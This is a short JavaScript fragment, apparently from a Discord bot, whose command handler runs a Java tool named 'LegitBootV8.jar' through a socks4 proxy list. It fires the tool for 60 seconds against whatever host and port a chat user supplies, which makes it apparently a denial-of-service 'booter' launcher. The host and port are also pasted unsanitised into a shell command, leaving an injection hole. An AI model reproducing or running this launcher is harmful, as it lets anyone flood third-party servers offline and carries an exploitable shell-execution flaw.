...
module.exports = {
  ...
  run: async ({client, message, args, MessageEmbed}) => {
    ...
    exec(`timeout 60 screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar ${host}:${port} 2 35 47 160 socks4.txt socks4`, (error, stdout, stderr) => {
    });
